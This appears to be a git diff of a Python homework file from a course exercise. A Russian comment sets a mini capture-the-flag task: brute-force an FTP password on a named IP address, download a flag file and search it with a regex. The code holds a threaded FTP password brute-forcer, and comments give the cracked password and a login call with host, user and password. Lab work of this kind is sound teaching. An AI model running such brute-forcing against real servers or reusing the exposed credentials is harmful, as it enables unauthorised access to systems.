@@ -1,8 +1,20 @@
-import contextlib
-from ftplib import FTP, all_errors
-import os
+# ДЗ №10 Светлаков Е.С.
+# Мини ЦТФ для желающих:
+# 1. сбрутить ФТП пароль для юзера test_user на сервере 45.143.93.4
+# 2. выкачать лежащий там файлик с флагом
+# 3. найти флаг по подсказке: в флаге присутствует кириллица
+# 4. флаг принесете на занятие:)
+# ЗЫ: просьба файл с флагом не удалять и вобще не шалить,
+# там пока права не настроены:)
+# ЗЗЫ: брутфорсер запускайте с time... , чтобы сравнить эффективность
+# для ориентира мой коленочный брутфорсер нашел верный пароль за 28 сек,
+# если идти от начала файла.
+
 import concurrent.futures
+import contextlib
+import os
 import re
+from ftplib import FTP, all_errors
 
 # https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python
 
@@ -13,7 +25,7 @@ def try_ftp(psw: str):
     try:
         with FTP(host=host, user=user, passwd=psw, timeout=5) as ftp:
             return psw
-    except all_errors as e:
+    except all_errors:
         return None
 
 
@@ -33,6 +45,7 @@ def work_ftp(host, user, password):
 
 os.chdir('./Lesson10')
 
+# bruting ftp password
 # psw= hacker9900
 # with open('psw.txt') as file:
 #     pswds = file.read().split("\n")
@@ -47,10 +60,11 @@ os.chdir('./Lesson10')
 #             print(f"Password for ftp: {password_for_ftp}")
 #             executor.shutdown(wait=False)
 
+# get file from ftp
 # work_ftp("45.143.93.4", "test_user", "hacker9900")
 
+# Search flag in file
 regexp_str = r'fl[А-Яа-я]g=[0-9]{1,}'
-# reg = re.compile(regexp_str)
 flag = ''
 with open('./xdz.crash.log', 'r') as file:
     for i, line in enumerate(file):
